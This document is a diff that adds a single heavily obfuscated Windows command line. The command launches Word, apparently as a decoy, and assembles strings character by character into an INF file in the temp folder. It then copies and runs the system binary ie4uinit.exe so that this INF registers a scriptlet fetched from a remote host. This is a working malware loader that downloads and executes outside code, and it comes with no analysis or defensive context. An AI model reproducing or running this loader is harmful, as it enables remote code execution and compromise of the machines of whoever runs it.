@@ -1,0 +1,28 @@
+/v /c start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" & (for %i in ("unvoyagingu=e" "unambushkar=ll" "peric=se" "tartarly=c" ) do @set %~i) &&
+  (for %p in ("m") do @set "cli=%~p") &&
+  call(for %c in ("s") do @set "dynamit=%~c") &&
+  callcall(for %j in ("s") do @set "dynamit=%~j") &&
+  (for %k in ("8") do @set "balearic=%~k") &&
+  call(for %m in ("u") do @set "attunement=%~m") &&
+  (for %f in ("=") do @set "mora=%~f") &&
+  (for %k in (" ") do @set "scenedesmus=%~k") &&
+  (for %n in ("e") do @set "tetrapods=%~n") &&
+  call(for %o in ("-") do @set "kabeljous=%~o") &&
+  callcall(for %y in ("%windir%") do @set "abil=%~y") &&
+  call(for %d in ("1") do @set "payload=%~d") &&
+  (for %r in ("r") do @set "adsorb=%~r") &&
+  call(for %h in ("l") do @set "entiretyar=%~h") &&
+  call(for %l in ("[") do @set "filth=%~l") &&
+  (for %g in ("_") do @set "caustici=%~g") &&
+  (for %o in ("u") do @set "attunement=%~o") &&
+  (for %u in ("e") do @set "tetrapods=%~u") &&
+  (for %n in ("X") do @set "breviradia=%~n") &&
+  call(for %i in ("l") do @set "entiretyar=%~i") &&
+  callcallcall(for %t in ("d") do @set "gonystyl=%~t") &&
+  (for %m in ("g") do @set "jugs=%~m") &&
+  call(for %o in ("f") do @set "videru=%~o") &&
+  (for %w in ("o") do @set "acetylate=%~w") &&
+  call(for %a in ("f") do @set "videru=%~a") &&
+  call(for %c in ("[destinationdirs]" "defaultdestdir=11" "8E6=01" "[strings]" "servicename= 'art'" "shortsvcname= 'art'" "hconv=." "colberte=/" "unhurte=:" "twiggiesti=I" "zimmerwald=b" "rateabil=d" "loon=e" "netc=f" "mammo=g" "photopile=h" "cinem=i" "precli=j" "stygi=l" "sulphoxismu=m" "mont=n" "sexagesima=o" "polyhy=r" "fish=s" "vexillar=t" "empye=u" "clie=v" "[version]" "signature=$windows nt$" "[8E6]" "%cinem%e%empye%i%mont%i%vexillar%.%cinem%n%netc%" "[dikeriain_9DD4]" "%fish%c%polyhy%o%zimmerwald%\" "%precli%.%rateabil%l%stygi%,N%twiggiesti%,%photopile%t%vexillar%p%unhurte%/%colberte%y%polyhy%f%mammo%a%netc%.%sulphoxismu%a%stygi%e%mont%e%zimmerwald%u%vexillar%l%loon%r%hconv%c%sexagesima%m%colberte%n%fish%o%clie%w%vexillar%" "[defaultinstall.windows7]" "delfiles=8E6" "Un\" "Register\" "OCXs=dikeriain_9DD4" ) do @echo %~c) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
